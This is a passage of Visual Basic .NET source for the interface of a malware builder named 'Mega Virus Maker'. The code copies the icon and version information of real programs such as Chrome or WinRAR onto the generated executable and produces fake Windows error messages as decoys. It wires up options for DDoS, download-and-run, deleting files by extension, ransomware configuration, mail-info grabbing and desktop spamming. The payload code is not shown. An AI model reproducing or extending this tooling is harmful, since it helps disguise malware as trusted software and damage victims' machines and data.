        Dim source As String = My.Resources.String1
        If File.Exists(Application.StartupPath & "\appli.exe") Then
            File.Delete(Application.StartupPath & "\appli.exe")
        End If
        Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
        Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
        Dim cResults As CompilerResults
        Dim Settings As New CompilerParameters()
        With Settings
            .GenerateExecutable = True
            .OutputAssembly = Application.StartupPath & "\appli.exe"
            .CompilerOptions = "/target:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .MainClass = "X"
        End With
        source = source.Replace("*Title*", Title.Text)
        source = source.Replace("*Description*", Description.Text)
        source = source.Replace("*Company*", Company.Text)
        source = source.Replace("*Product*", Product.Text)
        source = source.Replace("*Copyright*", Copyright.Text)
        source = source.Replace("*Trademark*", Trademark.Text)
        source = source.Replace("*version*", Ver1.Value & "." & Ver2.Value & "." & Ver3.Value & "." & Ver4.Value)
        source = source.Replace("*fversion*", FileVer1.Value.ToString & "." & FileVer2.Value.ToString & "." & FileVer3.Value.ToString & "." & FileVer4.Value.ToString)
        cResults = Compiler.CompileAssemblyFromSource(Settings, source)
        If cResults.Errors.Count > 0 Then
            For Each CompilerError In cResults.Errors
                MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next
            If File.Exists(Application.StartupPath & "\res.exe") = True Then
                File.Delete(Application.StartupPath & "\res.exe")
            End If
            If File.Exists(Application.StartupPath & "\res.log") = True Then
                File.Delete(Application.StartupPath & "\res.log")
            End If
            If File.Exists(Application.StartupPath & "\res.ini") = True Then
                File.Delete(Application.StartupPath & "\res.ini")
            End If
            If File.Exists(Application.StartupPath & "\appli.exe") Then
                File.Delete(Application.StartupPath & "\appli.exe")
            End If
            If File.Exists(Application.StartupPath & "\appli.res") Then
                File.Delete(Application.StartupPath & "\appli.res")
            End If
            MessageBox.Show("An error occurred. The assembly was not changed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        Dim otherfile As String = Application.StartupPath & "\appli.exe"
        Dim resfile As String = Application.StartupPath & "\appli.res"
        Dim mainfile As String = BuildFolder


        If usedexeico = False Then
            icn = TextBox1.Text
            Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -modify " & mainfile & "," & mainfile & "," & icn & ",ICONGROUP,32512,0")
        Else

            icn = TextBox1.Text
            Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -modify " & mainfile & "," & mainfile & "," & icn & ",ICONGROUP,32512,0")
            IO.File.Delete(icn)
        End If

        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,")
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -delete " & mainfile & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,")
        Shell(System.AppDomain.CurrentDomain.BaseDirectory() & "res.exe -addoverwrite " & mainfile & "," & mainfile & "," & resfile & ",VERSIONINFO,1,")





    End Sub


    Private Sub Panel3_Paint(sender As Object, e As PaintEventArgs)

    End Sub



    Private Sub NyX_Button14_Click(sender As Object, e As EventArgs)
        Custom_Site.Show()
    End Sub

    Private Sub NyX_Button15_Click(sender As Object, e As EventArgs)
        MsgBox(sel_custo_site)
    End Sub

    Private Sub NyX_CheckBox54_CheckedChanged(sender As Object)

    End Sub

    Private Sub NyX_Button13_Click(sender As Object, e As EventArgs)
        Keyb_inpt.Show()
    End Sub


    Private Sub NyX_GroupBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Panel3_MouseMove(sender As Object, e As MouseEventArgs)
        Panel3.Refresh()
    End Sub

    Private Sub Panel3_Scroll(sender As Object, e As ScrollEventArgs)
        Panel3.Refresh()
    End Sub

   

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        'PictureBox1.Image.Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\logo.png")
        chek_icons()
        X = Control.MousePosition.X - Me.Location.X
        Y = Control.MousePosition.Y - Me.Location.Y

    End Sub

    Private Sub NyX_Button18_Click(sender As Object, e As EventArgs) Handles NyX_Button18.Click
        Seti.Show()
    End Sub

    Private Sub TabPage5_Click(sender As Object, e As EventArgs) Handles TabPage5.Click

    End Sub
    Sub genmsg()
        Msg_titl.Text = Int(Rnd() * 9)
        Select Case TextBox7.Text
            Case 0
                Msg_titl.Text = "Chrome"
                msg_body.Text = ""
            Case 1
                Msg_titl.Text = "WinRAR"
                msg_body.Text = ""
            Case 2
                Msg_titl.Text = "Minecraft"
                msg_body.Text = ""
            Case 3
                Msg_titl.Text = "Opera"
                msg_body.Text = ""
            Case 4
                Msg_titl.Text = "IDM"
                msg_body.Text = ""
            Case 5
                Msg_titl.Text = "CCleaner"
                msg_body.Text = ""
            Case 6
                Msg_titl.Text = "VLC media player"
                msg_body.Text = ""

            Case 7
                Msg_titl.Text = "Resource Hacker"
                msg_body.Text = ""
            Case 10
                Msg_titl.Text = "Sony Vegas Pro"
                msg_body.Text = ""
        End Select
    End Sub



    Private Sub NyX_CheckBox67_CheckedChanged(sender As Object) Handles NyX_CheckBox67.CheckedChanged
        If NyX_CheckBox67.Checked = True Then
            Daynight.Show()
        Else
            Daynight.Hide()
        End If
    End Sub

  

    Private Sub NyX_Button6_Click_1(sender As Object, e As EventArgs) Handles NyX_Button6.Click
        Dim ofd As New OpenFileDialog With {.Filter = ".exe|*.exe", .FileName = "", .ShowHelp = True}
        If ofd.ShowDialog() = DialogResult.OK Then
            Dim x = GetFileVersion(ofd.FileName)
            Pathez.Text = ofd.FileName

            Title.Text = IO.Path.GetFileNameWithoutExtension(ofd.FileName)
            TextBox7.Text = Title.Text
            Description.Text = x.Description
            Company.Text = x.Company
            Product.Text = x.Product
            Copyright.Text = x.Copyright
            Trademark.Text = x.Trademarks
            usedexeico = True
            PictureBox3.Image = ReturnIcon(ofd.FileName, 0).ToBitmap
            Dim tmpbmp As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".bmp"
            Dim tempico As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".ico"
            TextBox1.Text = tempico
            ReturnIcon(ofd.FileName, 0).ToBitmap.Save(tmpbmp, System.Drawing.Imaging.ImageFormat.Png)
            PngIconConverter.Convertico(tmpbmp, tempico, 64, True)
            IO.File.Delete(tmpbmp)
        End If
    End Sub

    Private Sub Panel8_DragDrop(sender As Object, e As DragEventArgs) Handles Panel8.DragDrop
        If e.Data.GetDataPresent(DataFormats.FileDrop) = True Then
            Dim filea As String = e.Data.GetData(DataFormats.FileDrop)(0)
            Dim exepath As String
            Try
                If filea.EndsWith("lnk") Then
                    exepath = GetTargetPath(filea)
                    Dim x = GetFileVersion(exepath)
                    Pathez.Text = exepath

                    Title.Text = IO.Path.GetFileNameWithoutExtension(exepath)
                    TextBox7.Text = Title.Text
                    Description.Text = x.Description
                    Company.Text = x.Company
                    Product.Text = x.Product
                    Copyright.Text = x.Copyright
                    Trademark.Text = x.Trademarks
                    Ver1.Value = x.FileVersion.Major
                    Ver2.Value = x.FileVersion.Minor
                    Ver3.Value = x.FileVersion.Build
                    Ver4.Value = x.FileVersion.Rivision

                    PictureBox3.Image = ReturnIcon(exepath, 0).ToBitmap
                    Dim tmpbmp As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".png"
                    Dim tempico As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".ico"
                    TextBox1.Text = tempico
                    ReturnIcon(exepath, 0).ToBitmap.Save(tmpbmp, System.Drawing.Imaging.ImageFormat.Png)
                    PngIconConverter.Convertico(tmpbmp, tempico, 64, True)
                    IO.File.Delete(tmpbmp)
                Else
                    Dim x = GetFileVersion(filea)
                    Pathez.Text = filea

                    Title.Text = IO.Path.GetFileNameWithoutExtension(filea)
                    Description.Text = x.Description
                    Company.Text = x.Company
                    Product.Text = x.Product
                    Copyright.Text = x.Copyright
                    Trademark.Text = x.Trademarks
                    PictureBox3.Image = ReturnIcon(filea, 0).ToBitmap
                    Dim tmpbmp As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".png"
                    Dim tempico As String = Path.GetTempPath & "\" & RandomString(6, "", True, True, False, True, False) & ".ico"
                    TextBox1.Text = tempico
                    ReturnIcon(filea, 0).ToBitmap.Save(tmpbmp, System.Drawing.Imaging.ImageFormat.Png)
                    PngIconConverter.Convertico(tmpbmp, tempico, 64, True)
                    IO.File.Delete(tmpbmp)
                End If

            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End Try
        End If

    End Sub

    Private Sub Panel8_DragEnter(sender As Object, e As DragEventArgs) Handles Panel8.DragEnter
        Dim file As String = e.Data.GetData(DataFormats.FileDrop)(0)
        If file.EndsWith("exe") Or file.EndsWith("lnk") Then
            e.Effect = DragDropEffects.All
            Try
                If file.EndsWith("lnk") Then
                    Pathez.Text = GetTargetPath(file)
                Else
                    Pathez.Text = file
                End If
            Catch ex As Exception

            End Try
           

        End If

    End Sub

    Private Sub Panel8_DragLeave(sender As Object, e As EventArgs) Handles Panel8.DragLeave
        Pathez.Text = ""
    End Sub

    Private Sub NyX_CheckBox68_CheckedChanged(sender As Object) Handles NyX_CheckBox68.CheckedChanged
        If NyX_CheckBox68.Checked = True Then
            Ddos.show()
        Else
            Ddos.Hide()
        End If
    End Sub

    Private Sub NyX_CheckBox28_CheckedChanged_1(sender As Object) Handles NyX_CheckBox28.CheckedChanged
        If NyX_CheckBox28.Checked = True Then
            Junk.Show()
        Else
            Junk.Hide()
        End If

    End Sub

    Private Sub CrystalClearTextBox6_ValueChanged(sender As Object, e As EventArgs) Handles CrystalClearTextBox6.ValueChanged

    End Sub

    Private Sub NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles NumericUpDown1.ValueChanged
        If NumericUpDown1.Value = 100 Then
            MsgBox("Puting high size can take some time on building", MsgBoxStyle.Exclamation, "Warning")

        End If

    End Sub

    Private Sub NyX_CheckBox53_CheckedChanged(sender As Object) Handles NyX_CheckBox53.CheckedChanged
        If NyX_CheckBox53.Checked = True Then
            dwnrun.Show()
        Else
            dwnrun.Hide()
        End If
    End Sub

    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        If usedexeico = True Then

            Dim sfd As New SaveFileDialog
            sfd.Filter = "icon files|*.ico"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                File.Copy(TextBox1.Text, sfd.FileName)
                MsgBox("icon saved to :" & sfd.FileName)
            End If
        End If


    End Sub

    Private Sub NyX_Button1_Click(sender As Object, e As EventArgs) Handles NyX_Button1.Click
        msg_body.Text = Int(Rnd() * 9)
        Select Case msg_body.Text
            Case 0
                Msg_titl.Text = "Application Error"
                msg_body.Text = "The application failed to initialize properly (0xc000007b). Click on OK to terminate the application."
            Case 1
                Msg_titl.Text = "ERROR_WRONG_EFS"
                msg_body.Text = "The file was encrypted with a different encryption driver than is currently loaded."
            Case 2
                Msg_titl.Text = "ERROR_SERVICE_NEVER_STARTED"
                msg_body.Text = "No attempts to start the service have been made since the last boot."
            Case 3
                Msg_titl.Text = "ERROR_NO_RECOVERY_PROGRAM"
                msg_body.Text = "No recovery program has been configured for this service."
            Case 4
                Msg_titl.Text = "ERROR_APP_WRONG_OS"
                msg_body.Text = "The specified program is not a Windows or MS-DOS program"
            Case 5
                Msg_titl.Text = "ERROR_RMODE_APP"
                msg_body.Text = "The specified program was written for an earlier version of Windows."
            Case 6
                Msg_titl.Text = "ERROR_INVALID_DLL"
                msg_body.Text = "One of the library files needed to run this application is damaged."
            Case 7
                Msg_titl.Text = "ERROR_NO_ASSOCIATION"
                msg_body.Text = "No application is associated with the specified file for this operation."
            Case 10
                Msg_titl.Text = "ERROR_DLL_NOT_FOUND"
                msg_body.Text = "One of the library files needed to run this application cannot be found."
        End Select
    End Sub

    Private Sub NyX_Button19_Click(sender As Object, e As EventArgs)
        Getinfmail.Show()
    End Sub

    Private Sub NyX_Button16_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub NyX_Button20_Click(sender As Object, e As EventArgs)
        pic_link = InputBox("Entre a direct link to the image that you want to be spamed to the desktop", " leave blank if you dont want to use a custom image", "")
    End Sub

    Private Sub CrystalClearTextBox6_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles CrystalClearTextBox6.MouseDoubleClick
        MsgBox("1000 milliseconde = 1 Second", MsgBoxStyle.Information, "Info")
    End Sub

    Private Sub CrystalClearTextBox2_MouseMove_1(sender As Object, e As MouseEventArgs) Handles CrystalClearTextBox2.MouseMove
        CrystalClearTextBox2.Text = "MVM-" & Randome(10)
    End Sub

    Private Sub NyX_Button8_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub NyX_Button16_Click_1(sender As Object, e As EventArgs) Handles NyX_Button16.Click
        dlt_custo_ext = InputBox("Entre a file extension ", "Example : .pdf")
        NyX_CheckBox71.Text = "Delete " & dlt_custo_ext & " files"
    End Sub

    Private Sub NyX_Button8_Click_1(sender As Object, e As EventArgs) Handles NyX_Button8.Click
        Custom_prev.Show()
    End Sub

    Private Sub NyX_Button9_Click(sender As Object, e As EventArgs) Handles NyX_Button9.Click
        frm3.Show()
    End Sub

    Private Sub NyX_Button14_Click_1(sender As Object, e As EventArgs) Handles NyX_Button14.Click
        Custom_Site.Show()
    End Sub

    Private Sub NyX_Button7_Click(sender As Object, e As EventArgs) Handles NyX_Button7.Click
        Keyb_inpt.Show()
    End Sub

    Private Sub NyX_Button17_Click(sender As Object, e As EventArgs) Handles NyX_Button17.Click
        the_message.Show()
    End Sub

    Private Sub NyX_Button20_Click_1(sender As Object, e As EventArgs) Handles NyX_Button20.Click
        pic_link = InputBox("Entre a direct link to the image that you want to be spamed to the desktop", " leave blank if you dont want to use a custom image", "")
    End Sub

    Private Sub NyX_Button13_Click_1(sender As Object, e As EventArgs) Handles NyX_Button13.Click
        Daynight.Show()
    End Sub

    Private Sub NyX_Button10_Click(sender As Object, e As EventArgs) Handles NyX_Button10.Click
        spch_txt = InputBox("Entre a text to spech ", "")
    End Sub

    Private Sub NyX_Button15_Click_1(sender As Object, e As EventArgs) Handles NyX_Button15.Click
        rnsm_cnfg.Show()
    End Sub

    Private Sub NyX_Button19_Click_1(sender As Object, e As EventArgs) Handles NyX_Button19.Click
        Getinfmail.Show()
    End Sub

    Private Sub NyX_Button21_Click(sender As Object, e As EventArgs) Handles NyX_Button21.Click
        frm_txt = InputBox("What should the form say ?")
    End Sub

    Private Sub NyX_Button22_Click(sender As Object, e As EventArgs) Handles NyX_Button22.Click
        Tools.Show()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Clipboard.SetText(stat.Text)
    End Sub

    Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Try
            Dim k As New SaveFileDialog
            k.Filter = "text file|*.txt"
            If k.ShowDialog = Windows.Forms.DialogResult.OK Then
                My.Computer.FileSystem.WriteAllText(k.FileName, stat.Text, False)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try

    End Sub

  

    Private Sub NyX_Button23_Click(sender As Object, e As EventArgs) Handles NyX_Button23.Click
        Dim o As New Code_Editor
        o.txtb1.Language = FastColoredTextBoxNS.Language.Custom
        o.txtb1.Text = bat_scrpt
        o.NyX_Theme1.Text = "Code editor | Batch"
        o.Text = "Code editor | Batch"
        o.Show()
    End Sub

    Private Sub NyX_Button24_Click(sender As Object, e As EventArgs) Handles NyX_Button24.Click
        Dim o As New Code_Editor
        o.txtb1.Language = FastColoredTextBoxNS.Language.VB
        o.Text = vbs_scrpt
        o.NyX_Theme1.Text = "Code editor | VBS"
        o.Text = "Code editor | VBS"
        o.Show()
    End Sub

    Private Sub NyX_Button25_Click(sender As Object, e As EventArgs) Handles NyX_Button25.Click
        Dim o As New Code_Editor
        o.txtb1.Language = FastColoredTextBoxNS.Language.Custom
        o.Text = power_scrpt
        o.NyX_Theme1.Text = "Code editor | Powershell"
        o.Text = "Code editor | Powershell"
        o.Show()
    End Sub

    Private Sub NyX_Button26_Click(sender As Object, e As EventArgs) Handles NyX_Button26.Click
        'Visuel basic
        Dim o As New Code_Editor
        o.txtb1.Language = FastColoredTextBoxNS.Language.VB
        o.Text = vbs_scrpt
        o.NyX_Theme1.Text = "Code editor | Visuel basic"
        o.Text = "Code editor | Visuel basic"
        o.Show()
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "png|*.png|icon|*.ico"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            PictureBox3.Image.Save(sfd.FileName)
        End If


    End Sub

    Private Sub Trademark_TextChanged(sender As Object, e As EventArgs) Handles Trademark.TextChanged

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        If Me.WindowState = FormWindowState.Minimized Then
            NotifyIcon1.ShowBalloonTip(100, "Mega Virus Maker", "I'm right here if you need me", ToolTipIcon.Info)
            Me.ShowInTaskbar = False

            Timer3.Stop()
        End If
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Me.WindowState = FormWindowState.Normal
        Me.ShowInTaskbar = True
        Timer3.Start()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub ChekForUpdateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChekForUpdateToolStripMenuItem.Click
        If CheckForInternetConnection() = False Then
            NotifyIcon1.ShowBalloonTip(100, "Update check ", "no intrenet ", ToolTipIcon.Error)
        Else
            NotifyIcon1.ShowBalloonTip(100, "Update check ", chekup, ToolTipIcon.Info)
        End If

    End Sub

    Private Sub Updater_Tick(sender As Object, e As EventArgs) Handles Updater.Tick
        If chekup() = "No update are available for now" Then
        Else
            NotifyIcon1.ShowBalloonTip(100, " Mega virus maker - Update check ", chekup, ToolTipIcon.Info)
        End If

        If CheckForInternetConnection() = True Then
            GetMsg()
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        NotifyIcon1.Visible = False
    End Sub

    Private Sub LBL_ANI_Tick(sender As Object, e As EventArgs) Handles LBL_ANI.Tick
        If Label16.Right < 0 Then
            Label16.Left = Panel9.ClientSize.Width
        Else
            Label16.Left -= 10
        End If
    End Sub

    Private Sub Label16_Click(sender As Object, e As EventArgs) Handles Label16.Click

    End Sub

    Private Sub Panel9_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel9.MouseDown
        X = Control.MousePosition.X - Me.Location.X
        Y = Control.MousePosition.Y - Me.Location.Y
    End Sub

    Private Sub Panel9_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel9.MouseMove
        If e.Button = MouseButtons.Left Then
            newpoint = Control.MousePosition
            newpoint.Y -= (Y)
            newpoint.X -= (X)
            Me.Location = newpoint
        End If
    End Sub

    

    Private Sub NotifyIcon1_DoubleClick(sender As Object, e As EventArgs) Handles NotifyIcon1.DoubleClick
       
            Me.WindowState = FormWindowState.Normal
            Me.ShowInTaskbar = True
            Timer3.Start()

    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick

    End Sub
End Class
